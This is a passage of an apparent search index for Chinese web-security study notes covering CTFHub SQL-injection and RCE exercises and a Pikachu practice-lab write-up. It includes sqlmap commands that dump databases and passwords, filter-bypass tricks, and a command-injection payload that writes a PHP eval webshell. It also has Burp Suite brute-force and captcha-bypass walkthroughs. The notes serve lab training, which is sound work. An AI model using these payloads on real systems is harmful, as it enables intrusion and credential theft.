\u6362\u884c\u7b26\n3:0xb\u5b57\u7b26\u662f \u5782\u76f4\u5b9a\u4f4d\u7b26\n4:0xc\u5b57\u7b26\u662f \u6362\u9875\u952e\n5:0xd\u5b57\u7b26\u662f \u5f52\u4f4d\u7b26\n6:0x20\u5b57\u7b26\u662f \u63a7\u5236\u8bbe\u59074(\u7a7a\u683c)\n7:0x2b\u5b57\u7b26\u662f +\n</code></pre>"},{"location":"WEB/labs/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/#sql","title":"SQL\u6ce8\u5165","text":"<p>column_name : \u5217\u7684\u540d\u79f0</p> <p>Information_schema.columns : \u8868\u793a\u6240\u6709\u7684\u5217\u7684\u4fe1\u606f</p> <p>Information_schema : \u8868\u793a\u6240\u6709\u4fe1\u606f\uff0c\u5305\u62ec\u5e93\u3001\u8868\u3001\u5217</p> <p>Information_schema.tables : \u8868\u793a\u6240\u6709\u7684\u8868\u7684\u4fe1\u606f</p> <p>table_schema : \u6570\u636e\u5e93\u7684\u540d\u79f0</p> <p>table_name : \u8868\u7684\u540d\u79f0</p> <p>\u5173\u4e8e\u6ce8\u91ca\uff1aGET\uff08<code>--+</code>\uff09\uff0cPOST\uff08<code>#</code>\uff09</p> <p>@@basedir  \u5f97\u5230mysql\u8def\u5f84</p>"},{"location":"WEB/labs/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/#sqlmap","title":"sqlmap\u57fa\u7840\u547d\u4ee4","text":"<p>\u67e5\u8be2sqlmap\u662f\u5426\u5b58\u5728\u6ce8\u5165\u547d\u4ee4 sqlmap.py -u url/?id=1 </p> <p>\u67e5\u8be2\u5f53\u524d\u7528\u6237\u4e0b\u7684\u6240\u6709\u6570\u636e\u5e93 sqlmap.py -u url/?id=1 --dbs </p> <p>\u83b7\u53d6\u6570\u636e\u5e93\u7684\u8868\u540d sqlmap.py -u url/?id=1 -D (\u6570\u636e\u5e93\u540d) --tables </p> <p>\u83b7\u53d6\u8868\u4e2d\u7684\u5b57\u6bb5\u540d sqlmap.py -u url/?id=1 -D (\u6570\u636e\u5e93\u540d) -T (\u8f93\u5165\u9700\u8981\u67e5\u8be2\u7684\u8868\u540d) --columns </p> <p>\u83b7\u53d6\u5b57\u6bb5\u7684\u5185\u5bb9 sqlmap.py -u url/?id=1 -D (\u6570\u636e\u5e93\u540d) -T (\u8f93\u5165\u9700\u8981\u67e5\u8be2\u7684\u8868\u540d) -C (\u8868\u5185\u7684\u5b57\u6bb5\u540d) --dump </p> <p>\u67e5\u8be2\u6570\u636e\u5e93\u7684\u6240\u6709\u7528\u6237 sqlmap.py -u url/?id=1 --users </p> <p>\u67e5\u8be2\u6570\u636e\u5e93\u7684\u6240\u6709\u5bc6\u7801 sqlmap.py -u url/?id=1 --passwords </p> <p>\u67e5\u8be2\u6570\u636e\u5e93\u540d\u79f0 sqlmap.py -u url/?id=1 --current-db</p> <p>\u2014cookie  \u2013level 2</p> <p>\u2014ua lever 3</p> <p>sqlmap\u53ef\u4ee5\u5728\u8bf7\u6c42\u4e2d\u4f2aHTTP\u7684Referer\u5934\uff0c\u5f53--level\u53c2\u6570\u5927\u4e8e\u7b49\u4e8e3\u65f6\uff0c\u4f1a\u5c1d\u8bd5\u8fdb\u884crefer\u6ce8\u5165</p> <p>\u2013referer  level 5</p> <p>\u6709\u7684\u65f6\u5019\u626b\u4e0d\u51fa\u6ce8\u5165\u70b9\uff0c\u4e5f\u662f\u9700\u8981\u63d0\u5347 level \u7b49\u7ea7</p> <p>\u811a\u672c\u540d\uff1a space2comment.py  \u4f5c\u7528\uff1a\u7528\u6ce8\u91ca/**/\u66ff\u6362\u7a7a\u683c\u5b57\u7b26' '</p> <p>\u7ed5\u8fc7\u7a7a\u683c\u8fc7\u6ee4\u7684\u65b9\u6cd5   /**/\u3001()\u3001%0a</p>"},{"location":"WEB/labs/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/#mysql","title":"MySQL \u5220\u9664\u8868","text":"<p>delete\uff0cdrop\uff0ctruncate \u90fd\u6709\u5220\u9664\u8868\u7684\u4f5c\u7528\uff0c\u533a\u522b\u5728\u4e8e\uff1a</p> <ul> <li>1\u3001delete \u548c truncate \u4ec5\u4ec5\u5220\u9664\u8868\u6570\u636e\uff0cdrop \u8fde\u8868\u6570\u636e\u548c\u8868\u7ed3\u6784\u4e00\u8d77\u5220\u9664\uff0c\u6253\u4e2a\u6bd4\u65b9\uff0cdelete \u662f\u5355\u6740\uff0ctruncate \u662f\u56e2\u706d\uff0cdrop \u662f\u628a\u7535\u8111\u6454\u4e86\u3002</li> <li>2\u3001delete \u662f DML \u8bed\u53e5\uff0c\u64cd\u4f5c\u5b8c\u4ee5\u540e\u5982\u679c\u6ca1\u6709\u4e0d\u60f3\u63d0\u4ea4\u4e8b\u52a1\u8fd8\u53ef\u4ee5\u56de\u6eda\uff0ctruncate \u548c drop \u662f DDL \u8bed\u53e5\uff0c\u64cd\u4f5c\u5b8c\u9a6c\u4e0a\u751f\u6548\uff0c\u4e0d\u80fd\u56de\u6eda\uff0c\u6253\u4e2a\u6bd4\u65b9\uff0cdelete \u662f\u53d1\u5fae\u4fe1\u8bf4\u5206\u624b\uff0c\u540e\u6094\u8fd8\u53ef\u4ee5\u64a4\u56de\uff0ctruncate \u548c drop \u662f\u76f4\u63a5\u6247\u8033\u5149\u8bf4\u6eda\uff0c\u4e0d\u80fd\u53cd\u6094\u3002</li> <li>3\u3001\u6267\u884c\u7684\u901f\u5ea6\u4e0a\uff0cdrop&gt;truncate&gt;delete\uff0c\u6253\u4e2a\u6bd4\u65b9\uff0cdrop \u662f\u795e\u821f\u706b\u7bad\uff0ctruncate \u662f\u548c\u8c10\u53f7\u52a8\u8f66\uff0cdelete \u662f\u81ea\u884c\u8f66\u3002</li> </ul>"},{"location":"WEB/labs/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91%E7%AC%94%E8%AE%B0/#rce","title":"RCE","text":"<p>\u8fc7\u6ee4 cat</p> <p>\u65b9\u6cd5\u4e00\u5f53cat\u88ab\u8fc7\u6ee4\u540e,\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e0b\u547d\u4ee4\u8fdb\u884c\u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9 (1)more:\u4e00\u9875\u4e00\u9875\u7684\u663e\u793a\u7684\u663e\u793a\u6863\u6848\u5185\u5bb9 (2)less:\u4e0emore\u7c7b\u4f3c,\u4f46\u662f\u6bd4more\u66f4\u597d\u7684\u662f,\u4ed6\u53ef\u4ee5[pg dn][pg up]\u7ffb\u9875 (3)head:\u67e5\u770b\u5934\u51e0\u884c (4)tac:\u4ece\u6700\u540e\u4e00\u884c\u5f00\u59cb\u663e\u793a,\u53ef\u4ee5\u770b\u51fatac\u662fcat\u7684\u53cd\u5411\u663e\u793a (5)tail:\u67e5\u770b\u5c3e\u51e0\u884c (6)nl:\u663e\u793a\u7684\u65f6\u5019,\u987a\u4fbf\u8f93\u51fa\u884c\u53f7 (7)od:\u4ee5\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\u8bfb\u53d6\u6863\u6848\u5185\u5bb9 (8)vi:\u4e00\u79cd\u7f16\u8f91\u5668\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u67e5\u770b (9)vim:\u4e00\u79cd\u7f16\u8f91\u5668,\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u67e5\u770b (10)sort:\u53ef\u4ee5\u67e5\u770b (11)uniq:\u53ef\u4ee5\u67e5\u770b</p> <p>\u65b9\u6cd5\u4e8c \u4e00\u53e5\u8bdd\u6728\u9a6c \u6784\u9020payload\u5982\u4e0b\uff1a</p> <p>CTFHub  RCE \u2013\uff08\u547d\u4ee4\u6ce8\u5165\uff0c\u8fc7\u6ee4cat\uff09\uff1a  <code>127.0.0.1&amp;echo \"&lt;?php @eval(\\$_POST['a']);?&gt;\" &gt;&gt;shell.php</code></p> <p>\u65b9\u6cd5\u4e09 \u53cd\u659c\u6760 \uff1a \u4f8b\u5982 ca\\t fl\\ag.php \u8fde\u63a5\u7b26\uff1a \u4f8b\u5982 ca\u2019\u2018t fla\u2018\u2019g.txt</p> <p>\u8fc7\u6ee4\u7a7a\u683c\uff0c\u5176\u5b9e\u5c31<code>;</code>\u5c31\u884c\u5440</p> <p>\u5f53\u7a7a\u683c\u88ab\u8fc7\u6ee4\u540e,\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e0b\u547d\u4ee4\u8fdb\u884c\u8bfb\u53d6\u6587\u4ef6\u7684\u5185\u5bb9 <code>&lt;</code> <code>&lt;&gt;</code> <code>&gt;</code>\u91cd\u5b9a\u5411\u7b26 <code>%09</code>(\u9700\u8981php\u73af\u5883)(tab) <code>%20</code>(space) <code>${IFS}</code> <code>$IFS$9</code> {cat,flag.php} //\u7528\u9017\u53f7\u5b9e\u73b0\u4e86\u7a7a\u683c\u529f\u80fd <code>%20</code></p> <p>PS\uff1a\u4e3a\u4ec0\u4e48\u6211\u53ea\u6709<code>&lt;</code>\u53ef\u4ee5</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/","title":"Pikachu\u9776\u573a\u6253\u9776\u8bb0\u5f55","text":""},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pikachu","title":"\u4e00\u3001Pikachu\u9776\u573a\u4ecb\u7ecd","text":"<p>Pikachu\u662f\u4e00\u4e2a\u5e26\u6709\u6f0f\u6d1e\u7684Web\u5e94\u7528\u7cfb\u7edf\uff0c\u5728\u8fd9\u91cc\u5305\u542b\u4e86\u5e38\u89c1\u7684web\u5b89\u5168\u6f0f\u6d1e\u3002 \u5982\u679c\u4f60\u662f\u4e00\u4e2aWeb\u6e17\u900f\u6d4b\u8bd5\u5b66\u4e60\u4eba\u5458\u4e14\u6b63\u53d1\u6101\u6ca1\u6709\u5408\u9002\u7684\u9776\u573a\u8fdb\u884c\u7ec3\u4e60\uff0c\u90a3\u4e48Pikachu\u53ef\u80fd\u6b63\u5408\u4f60\u610f\u3002</p> <p>\u6f0f\u6d1e\u7c7b\u578b\u5217\u8868\u5982\u4e0b</p> <ul> <li>Burt Force(\u66b4\u529b\u7834\u89e3\u6f0f\u6d1e) </li> <li>XSS(\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e) </li> <li>CSRF(\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020) </li> <li>SQL-Inject(SQL\u6ce8\u5165\u6f0f\u6d1e)</li> <li>RCE(\u8fdc\u7a0b\u547d\u4ee4/\u4ee3\u7801\u6267\u884c) </li> <li>Files Inclusion(\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e) </li> <li>Unsafe file downloads(\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u4e0b\u8f7d) </li> <li>Unsafe file uploads(\u4e0d\u5b89\u5168\u7684\u6587\u4ef6\u4e0a\u4f20) </li> <li>Over Permisson(\u8d8a\u6743\u6f0f\u6d1e) </li> <li>../../../(\u76ee\u5f55\u904d\u5386) </li> <li>I can see your ABC(\u654f\u611f\u4fe1\u606f\u6cc4\u9732) </li> <li>PHP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e </li> <li>XXE(XML External Entity attack) </li> <li>\u4e0d\u5b89\u5168\u7684URL\u91cd\u5b9a\u5411 </li> <li>SSRF(Server-Side Request Forgery) </li> <li>More...(\u627e\u627e\u770b?..\u6709\u5f69\u86cb!) </li> <li>\u7ba1\u7406\u5de5\u5177\u91cc\u9762\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u6613\u7684xss\u7ba1\u7406\u540e\u53f0,\u4f9b\u4f60\u6d4b\u8bd5\u9493\u9c7c\u548c\u635e cookie~</li> </ul>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#_1","title":"\u4e8c\u3001\u6253\u9776\u8bb0\u5f55","text":"<p>\uff08\u6b64\u6587\u6240\u7528\u73af\u5883\u4e3aJava17 + phpstudy + Burp Suite V2023.10.2 + pikachu\uff09</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#1","title":"1 \u66b4\u529b\u7834\u89e3","text":"<p>Burte Force\uff08\u66b4\u529b\u7834\u89e3\uff09\u6982\u8ff0\uff1a \u201c\u66b4\u529b\u7834\u89e3\u201d\u662f\u4e00\u653b\u51fb\u5177\u624b\u6bb5\uff0c\u5728web\u653b\u51fb\u4e2d\uff0c\u4e00\u822c\u4f1a\u4f7f\u7528\u8fd9\u79cd\u624b\u6bb5\u5bf9\u5e94\u7528\u7cfb\u7edf\u7684\u8ba4\u8bc1\u4fe1\u606f\u8fdb\u884c\u83b7\u53d6\u3002 \u5176\u8fc7\u7a0b\u5c31\u662f\u4f7f\u7528\u5927\u91cf\u7684\u8ba4\u8bc1\u4fe1\u606f\u5728\u8ba4\u8bc1\u63a5\u53e3\u8fdb\u884c\u5c1d\u8bd5\u767b\u5f55\uff0c\u76f4\u5230\u5f97\u5230\u6b63\u786e\u7684\u7ed3\u679c\u3002 \u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u66b4\u529b\u7834\u89e3\u4e00\u822c\u4f1a\u4f7f\u7528\u5e26\u6709\u5b57\u5178\u7684\u5de5\u5177\u6765\u8fdb\u884c\u81ea\u52a8\u5316\u64cd\u4f5c\u3002 \u7406\u8bba\u4e0a\u6765\u8bf4\uff0c\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u662f\u53ef\u4ee5\u88ab\u66b4\u529b\u7834\u89e3\u7684\uff0c\u53ea\u8981\u653b\u51fb\u8005\u6709\u8db3\u591f\u5f3a\u5927\u7684\u8ba1\u7b97\u80fd\u529b\u548c\u65f6\u95f4\uff0c\u6240\u4ee5\u65ad\u5b9a\u4e00\u4e2a\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u66b4\u529b\u7834\u89e3\u6f0f\u6d1e\uff0c\u5176\u6761\u4ef6\u4e5f\u4e0d\u662f\u7edd\u5bf9\u7684\u3002 \u6211\u4eec\u8bf4\u4e00\u4e2aweb\u5e94\u7528\u7cfb\u7edf\u5b58\u5728\u66b4\u529b\u7834\u89e3\u6f0f\u6d1e\uff0c\u4e00\u822c\u662f\u6307\u8be5web\u5e94\u7528\u7cfb\u7edf\u6ca1\u6709\u91c7\u7528\u6216\u8005\u91c7\u7528\u4e86\u6bd4\u8f83\u5f31\u7684\u8ba4\u8bc1\u5b89\u5168\u7b56\u7565\uff0c\u5bfc\u81f4\u5176\u88ab\u66b4\u529b\u7834\u89e3\u7684\u201c\u53ef\u80fd\u6027\u201d\u53d8\u7684\u6bd4\u8f83\u9ad8\u3002 \u8fd9\u91cc\u7684\u8ba4\u8bc1\u5b89\u5168\u7b56\u7565, \u5305\u62ec\uff1a 1.\u662f\u5426\u8981\u6c42\u7528\u6237\u8bbe\u7f6e\u590d\u6742\u7684\u5bc6\u7801\uff1b 2.\u662f\u5426\u6bcf\u6b21\u8ba4\u8bc1\u90fd\u4f7f\u7528\u5b89\u5168\u7684\u9a8c\u8bc1\u7801\uff08\u60f3\u60f3\u4f60\u4e70\u706b\u8f66\u7968\u65f6\u8f93\u7684\u9a8c\u8bc1\u7801\uff5e\uff09\u6216\u8005\u624b\u673aotp\uff1b 3.\u662f\u5426\u5bf9\u5c1d\u8bd5\u767b\u5f55\u7684\u884c\u4e3a\u8fdb\u884c\u5224\u65ad\u548c\u9650\u5236\uff08\u5982\uff1a\u8fde\u7eed5\u6b21\u9519\u8bef\u767b\u5f55\uff0c\u8fdb\u884c\u8d26\u53f7\u9501\u5b9a\u6216IP\u5730\u5740\u9501\u5b9a\u7b49\uff09\uff1b 4.\u662f\u5426\u91c7\u7528\u4e86\u53cc\u56e0\u7d20\u8ba4\u8bc1\uff1b ...\u7b49\u7b49\u3002 \u5343\u4e07\u4e0d\u8981\u5c0f\u770b\u66b4\u529b\u7834\u89e3\u6f0f\u6d1e,\u5f80\u5f80\u8fd9\u79cd\u7b80\u5355\u7c97\u66b4\u7684\u653b\u51fb\u65b9\u5f0f\u5e26\u6765\u7684\u6548\u679c\u662f\u8d85\u51fa\u9884\u671f\u7684!</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#1x01","title":"1x01 \u57fa\u4e8e\u8868\u5355\u7684\u66b4\u529b\u7834\u89e3","text":"<ol> <li>\u5728\u201cUsername\u201d\u548c\u201cPassword\u201d\u4e2d\u8f93\u5165\u4efb\u610f\u5b57\u7b26\uff0c\u70b9\u51fbLogin </li> <li>\u5728Burp Suite\u4e2d\u6293\u5305\uff0c\u5982\u56fe\uff0c\u5c06\u6240\u6293\u6570\u636e\u5305\u53d1\u9001\u81f3Intruder\u6a21\u5757 </li> <li>\u653b\u51fb\u65b9\u5f0f\u9009\u62e9Cluster Bomb    </li> <li>\u5c06Payload\u8bbe\u7f6e\u4e3a\u201cRuntime file\u201d\uff0c\u5e76\u6dfb\u52a0\u76f8\u5e94\u5b57\u5178\uff0c\u5982\u56fe\u4e3a\u6211\u4f7f\u7528\u7684\u7b80\u6613\u5b57\u5178 </li> <li>\u5728Setting\u754c\u9762\u5c06Grep\u5168\u90e8\u5220\u9664\uff0c\u4e4b\u540e\u901a\u8fc7\u957f\u5ea6\u5224\u65ad\u662f\u5426\u7206\u7834\u6210\u529f\u5373\u53ef</li> <li>\u5f00\u59cb\u7206\u7834\uff0c\u9009\u62e9\u6309\u7167\u957f\u5ea6\u6392\u5e8f\uff0c\u53d1\u73b0\u201cadmin\u201d \u201c123455\u201d\u4e3a\u4e00\u7ec4\u8d26\u53f7\u5bc6\u7801\uff0c\u4e14\u5728\u539f\u7f51\u9875\u5c1d\u8bd5\u767b\u9646\u6210\u529f</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#1x02-on-server","title":"1x02 \u9a8c\u8bc1\u7801\u7ed5\u8fc7(on server)","text":"<ol> <li>\u6d4b\u8bd5\u53d1\u73b0\uff0c\u8f93\u5165\u968f\u610f\u8d26\u53f7\u5bc6\u7801\uff0c\u9519\u8bef\u9a8c\u8bc1\u7801\u4f1a\u63d0\u793a\u201c\u9a8c\u8bc1\u7801\u8f93\u5165\u9519\u8bef\u54e6\uff01\u201d\u3002 \u8f93\u5165\u968f\u610f\u8d26\u53f7\u5bc6\u7801\uff0c\u6b63\u786e\u9a8c\u8bc1\u7801\u4f1a\u63d0\u793a\u201cusername or password is not exists\uff5e\u201d\u3002 \u6545\u8f93\u5165\u968f\u673a\u8d26\u53f7\u5bc6\u7801\uff0c\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\uff0c\u7528Burp Suite\u6293\u5305\uff0c</li> <li> <p>\u5c06\u8be5\u6570\u636e\u5305\u53d1\u9001\u81f3Intruder\u6a21\u5757\uff0c\u6d4b\u8bd5\u53d1\u73b0\u5c06\u9a8c\u8bc1\u7801\u4fee\u6539\u4e3a\u7b2c\u4e00\u6b21\u63d0\u4ea4\u539f\u7f51\u9875\u66f4\u65b0\u540e\u7684\u9a8c\u8bc1\u7801\u4e4b\u540e\uff0c\u5373\u523b\u968f\u610f\u4fee\u6539\u8d26\u53f7\u5bc6\u7801\u5e76\u53ef\u6210\u529f\u63d0\u4ea4\uff0c\u8fd9\u662f\u56e0\u4e3a\u9a8c\u8bc1\u7801\u5728\u540e\u53f0\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u8fc7\u671f\u64cd\u4f5c\uff0c\u81f4\u4f7f\u8be5\u9a8c\u8bc1\u7801\u5728\u591a\u6b21\u63d0\u4ea4\u540e\u4ecd\u672a\u88ab\u9500\u6bc1\uff0c\u6545\u7528\u6237\u53ef\u7ed5\u8fc7\u9a8c\u8bc1\u7801\u4e0d\u65ad\u63d0\u4ea4\u8bf7\u6c42</p> </li> <li> <p>\u6b64\u65f6\u60c5\u51b5\u53d8\u5f97\u4e0e1x01\u4e00\u81f4\uff0c\u6545\u91cd\u590d1x01\u8fc7\u7a0b\uff0c\u5b8c\u6210\u7206\u7834</p> </li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#1x03-on-client","title":"1x03 \u9a8c\u8bc1\u7801\u7ed5\u8fc7(on client)","text":"<ol> <li>\u6d4b\u8bd5\u53d1\u73b0\uff0c\u8f93\u5165\u968f\u610f\u8d26\u53f7\u5bc6\u7801\uff0c\u9519\u8bef\u9a8c\u8bc1\u7801\u4f1a\u63d0\u793a\u201c\u9a8c\u8bc1\u7801\u8f93\u5165\u9519\u8bef\u54e6\uff01\u201d\u3002 \u8f93\u5165\u968f\u610f\u8d26\u53f7\u5bc6\u7801\uff0c\u6b63\u786e\u9a8c\u8bc1\u7801\u4f1a\u63d0\u793a\u201cusername or password is not exists\uff5e\u201d\u3002 \u6545\u8f93\u5165\u968f\u673a\u8d26\u53f7\u5bc6\u7801\uff0c\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\uff0c\u7528Burp Suite\u6293\u5305 </li> <li>\u5c06\u6b64\u6570\u636e\u5305\u53d1\u9001\u81f3Repeater\u91cd\u653e\u5668\u4e2d</li> <li>\u6d4b\u8bd5\u53d1\u73b0\uff0c\u4e0d\u4fee\u6539\u9a8c\u8bc1\u7801\uff0c\u53ea\u4fee\u6539\u8d26\u53f7\u5bc6\u7801\u4ecd\u53ef\u5c06\u6570\u636e\u5305\u53d1\u9001\u51fa\u53bb\uff0c\u4e14\u76f8\u5e94\u9875\u9762\u63d0\u793a\u4e3a\u201cusername or password is not exists\uff5e\u201d\uff0c\u6545\u53d1\u73b0\uff0c\u6b64\u5904\u7684\u9a8c\u8bc1\u7801\u53ea\u662f\u5728\u524d\u7aef\u9650\u5236\u53d1\u9001\u884c\u4e3a\uff0c\u5f53\u6211\u4eec\u901a\u8fc7\u6293\u5305\u7ed5\u8fc7\u524d\u7aef\u7684\u53d1\u9001\u884c\u4e3a\u65f6\uff0c\u6b64\u9a8c\u8bc1\u7801\u5c31\u5931\u53bb\u4e86\u4f5c\u7528\uff0c\u56e0\u6b64\u6211\u4eec\u5c06\u6b64\u6570\u636e\u5305\u76f4\u63a5\u8f6c\u53d1\u5230Intruder\u6a21\u5757\uff0c\u5982\u56fe\u8bbe\u7f6e\uff0c\u91cd\u590d\u201c0x01\u201d\u6b65\u9aa4\uff0c\u5373\u53ef\u6210\u529f\u7206\u7834 </li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#1x04-token","title":"1x04 token\u9632\u7206\u7834?","text":"<ol> <li>\u63d0\u4ea4\u968f\u610f\u8d26\u6237\u548c\u5bc6\u7801\uff0c\u63d0\u4ea4\u6570\u636e</li> <li>\u7528Burp Suite\u6293\u5305\uff0c\u53d1\u9001\u81f3Intruder\u6a21\u5757</li> <li>\u7206\u7834\u7c7b\u578b\u8bbe\u7f6e\u4e3a\u201cPitchfork\u201d\uff0c\u6b64\u7206\u7834\u65b9\u6cd5\u4e3a\uff0c\u518d\u7206\u7834\u65f6\u5206\u522b\u4f7f\u7528\u5bf9\u5e94\u7684\u5b57\u5178\u5bf9\u53d8\u91cf\u8fdb\u884c\u540c\u65f6\u66ff\u6362\uff0c\u4e5f\u5c31\u662f\u8bf4username\u5b57\u5178\u7684\u7b2c\u4e00\u4e2a\u8d26\u6237\u5bf9\u5e94password\u5b57\u5178\u7684\u7b2c\u4e8c\u4e2a\u8d26\u6237\uff0c\u8bf8\u5982\u6b64\u7c7b\u3002\u5e76\u5c06\u5982\u4e0b\u56fe1\u3001</li> <li>\u5206\u522b\u5c06\u201cPayload Set\u201d1\u30012\u8bbe\u7f6e\u4e3a\u201cRuntime file\u201d\uff0c\u5e76\u6dfb\u52a0\u76f8\u5e94\u5b57\u5178\u6587\u4ef6</li> <li>\u7531\u4e8e\u6b64\u6570\u636e\u5305\u4e2d\u5305\u542btoken\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06Payload set 3 \u8bbe\u7f6e\u6bcf\u6b21\u4ece\u4e0a\u6b21\u54cd\u5e94\u6570\u636e\u5305\u4e2d\u83b7\u53d6token\u3002\u64cd\u4f5c\u5982\u4e0b\uff1a\u5728\u201cSetting\u201d\u9009\u9879\u5361\u4e0b\u201cGrep-Extract\u201d\u4e2d\u6dfb\u52a0(Add)\uff0c\u5728\u5f39\u51fa\u754c\u9762\u4e2d\u641c\u7d22token\uff0c\u627e\u5230\u5982\u56fe\u4f4d\u7f6e\uff0c\u9009\u4e2dtoken\u6570\u503c\uff0c\u5e76\u70b9\u51fb\u4e0b\u65b9\u201cOK\u201d\u3002\u5f53\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u201cGrep-Match\u201d\u4e2d\u5b57\u7b26\u5220\u9664\u5e76\u6dfb\u52a0\u201cusername or password is not exists\u201d\u7b49\u5b57\u6837\u3002</li> <li>\u5728Payload\u9009\u9879\u5361\u4e0b\u5c06\u7b2c\u4e09\u9879\uff08token\uff09\u8bbe\u7f6e\u4e3a\u201cRecursive grep\u201d\uff08\u9012\u5f52grep\uff09\uff0c\u5e76\u586b\u5199\u7b2c\u4e00\u6b21\u6570\u636e\u5305\u4e2d\u7684token</li> <li>\u70b9\u51fb\u7206\u7834\uff0c\u6b64\u65f6\u82e5\u6709\u62a5\u9519\u201crecursive grep payloads cannot be used with multiple request threads\u201d\u5219\u5c06\u5e76\u53d1\u6570\u6539\u4e3a1\u5373\u53ef\u3002 \u7406\u89e3\uff1atoken\u503c\u662f\u670d\u52a1\u5668\u53d1\u56de\u6765\u7684\u968f\u673a\u503c\uff0c\u5e76\u4e14\u662f\u5728\u4e0a\u4e00\u6b21\u54cd\u5e94\u4e2d\u53d1\u56de\u6765\u7684\uff0c\u4e4b\u540e\u5728\u8fd9\u6b21\u7684\u63d0\u4ea4\u8fc7\u7a0b\u4e2dtoken\u4f1a\u548c\u5176\u4ed6\u6570\u636e\u4e00\u8d77\u63d0\u4ea4\u81f3\u670d\u52a1\u5668\u9a8c\u8bc1\uff0c\u6545\u6211\u4eec\u53ef\u4ee5\u7528Burp\u4fdd\u5b58\u6bcf\u6b21\u53d1\u56de\u6765\u7684token\u7528\u4e8e\u4e0b\u4e00\u6b21\u7684\u63d0\u4ea4\u3002 \u201c1.\u5c06token\u4ee5\"type= 'hidden\u2019\u201d\u7684\u5f62\u5f0f\u8f93\u51fa\u5728\u8868\u5355\u4e2d;\u201d \u201c2.\u5728\u63d0\u4ea4\u7684\u8ba4\u8bc1\u7684\u65f6\u5019\u4e00\u8d77\u63d0\u4ea4\uff0c\u5e76\u5728\u540e\u53f0\u5bf9\u5176\u8fdb\u884c\u6821\u9a8c;\u201d \u201c3.\u4f46\u7531\u4e8e\u5176token\u503c\u8f93\u51fa\u5728\u4e86\u524d\u7aef\u6e90\u7801\u4e2d\uff0c\u5bb9\u6613\u88ab\u83b7\u53d6\uff0c\u56e0\u6b64\u4e5f\u5c31\u5931\u53bb\u4e86\u9632\u66b4\u529b\u7834\u89e3\u7684\u610f\u4e49\u201d</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#2-cross-site-scripting","title":"2 Cross-Site Scripting","text":"<p>XSS\uff08\u8de8\u7ad9\u811a\u672c\uff09\u6982\u8ff0 Cross-Site Scripting \u7b80\u79f0\u4e3a\u201cCSS\u201d\uff0c\u4e3a\u907f\u514d\u4e0e\u524d\u7aef\u53e0\u6210\u6837\u5f0f\u8868\u7684\u7f29\u5199\"CSS\"\u51b2\u7a81\uff0c\u6545\u53c8\u79f0XSS\u3002\u4e00\u822cXSS\u53ef\u4ee5\u5206\u4e3a\u5982\u4e0b\u51e0\u79cd\u5e38\u89c1\u7c7b\u578b\uff1a     1.\u53cd\u5c04\u6027XSS;     2.\u5b58\u50a8\u578bXSS;     3.DOM\u578bXSS;</p> <p>XSS\u6f0f\u6d1e\u4e00\u76f4\u88ab\u8bc4\u4f30\u4e3aweb\u6f0f\u6d1e\u4e2d\u5371\u5bb3\u8f83\u5927\u7684\u6f0f\u6d1e\uff0c\u5728OWASP TOP10\u7684\u6392\u540d\u4e2d\u4e00\u76f4\u5c5e\u4e8e\u524d\u4e09\u7684\u6c5f\u6e56\u5730\u4f4d\u3002 XSS\u662f\u4e00\u79cd\u53d1\u751f\u5728\u524d\u7aef\u6d4f\u89c8\u5668\u7aef\u7684\u6f0f\u6d1e\uff0c\u6240\u4ee5\u5176\u5371\u5bb3\u7684\u5bf9\u8c61\u4e5f\u662f\u524d\u7aef\u7528\u6237\u3002 